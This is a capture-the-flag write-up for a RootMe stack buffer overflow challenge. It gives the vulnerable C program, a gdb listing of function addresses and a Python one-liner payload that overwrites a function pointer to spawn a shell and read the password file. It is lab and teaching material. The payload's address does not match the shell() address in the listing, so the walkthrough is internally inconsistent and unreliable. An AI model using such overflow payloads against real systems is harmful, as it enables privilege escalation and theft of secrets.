# ELF x86: Stack buffer overflow basic 2

[RootMe challenge: ELF x86 - Stack buffer overflow basic 2](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-2?lang=en): An intermediate level to familiarize yourself with stack overflows.

Environment configuration:

```text
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 No 
NX 	Non-Executable Stack 	                 Yes 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 
```

Source code:

```text
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
void shell() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}
 
void sup() {
    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}
 
void main()
{
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```

----

```text
app-systeme-ch15@challenge02:~$ gdb ch15
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
...
Reading symbols from ch15...(no debugging symbols found)...done.
```

```text
(gdb) info functions
All defined functions:
 
Non-debugging symbols:
0x08048350  _init
0x08048390  fgets@plt
0x080483a0  geteuid@plt
0x080483b0  puts@plt
0x080483c0  system@plt
0x080483d0  setreuid@plt
0x080483e0  __libc_start_main@plt
0x080483f0  __gmon_start__@plt
0x08048400  _start
0x08048440  _dl_relocate_static_pie
0x08048450  __x86.get_pc_thunk.bx
0x08048460  deregister_tm_clones
0x080484a0  register_tm_clones
0x080484e0  __do_global_dtors_aux
0x08048510  frame_dummy
0x08048516  shell
0x08048559  sup
0x08048584  main
0x080485de  __x86.get_pc_thunk.ax
0x080485f0  __libc_csu_init
---Type <return> to continue, or q <return> to quit---q
Quit
```

```text
app-systeme-ch15@challenge02:~$ cat <(python -c "print 'A'*128 + '\x64\x84\x04\x08'") - | ./ch15
cat .passwd
```

## Resources

* [Débordement de tampon - dans la pile](https://www.root-me.org/spip.php?article807)
* [François Boisson : Buffer Overflow ou explication de «une faille de type bufferoverflow ...](https://www.youtube.com/watch?v=u-OZQkv2ebw) (YouTube)
* [Stack Bug - Exploitation avancee de buffer overflow](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/FR%20-%20Stack%20Bug%20-%20Exploitation%20avancee%20de%20buffer%20overflow.pdf)
* [Exploiting Stack Buffer Overflows in the Linux x86 Kernel](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Exploiting%20Stack%20Buffer%20Overflows%20in%20the%20Linux%20x86%20Kernel.pdf)
* [64 Bits Linux Stack Based Buffer Overflow](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf)